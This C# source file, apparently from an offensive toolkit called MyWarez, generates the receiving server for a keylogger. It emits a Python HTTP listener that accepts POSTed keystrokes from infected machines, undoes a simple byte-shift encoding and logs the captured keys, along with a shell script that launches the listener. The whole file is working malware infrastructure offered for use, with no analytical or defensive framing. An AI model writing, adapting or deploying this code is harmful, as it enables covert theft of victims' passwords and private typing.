using MyWarez.Core;
using System;
using System.Collections.Generic;
using System.IO;

namespace MyWarez.Base
{
    public class KeyloggerServerOutput : ListenerServerOutput
    {
        public KeyloggerServerOutput(Host host, int port, string name = "KeyloggerServer", string baseDirectory = "")
            : base(host, port, name, relativeDirectory: "", baseDirectory: baseDirectory)
        {
            Add("keylogger_server.py", PythonScript);
            Add("launch.sh", LaunchScriptSh);
        }

        private string PythonScript
        {
            get => @"
#!/usr/bin/env python3
""""""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
""""""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

def decrypt_keys(enc_keys):
    return bytes([x-1 for x in enc_keys])

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info(""GET request,\nPath: %s\nHeaders:\n%s\n"", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write(""GET request for {}"".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        if len(post_data):
            logging.info(""Recieved Logged Keys! \n%s\n"", decrypt_keys(post_data).decode('ascii'))
        self._set_response()

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting keylogger server...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping keylogger server...\n')

if __name__ == '__main__':
    from sys import argv

    PORT = int(argv[1])

    run(port=PORT)
";
        }

        private string LaunchScriptSh
        {
            get => $@"
SCRIPT_DIR=""$(cd ""$( dirname ""${{BASH_SOURCE[0]}}"" )"" &> /dev/null && pwd )""
(cd ""$SCRIPT_DIR""; exec python3 keylogger_server.py {Port})
".Replace("\r\n", "\n");
        }
    }
}
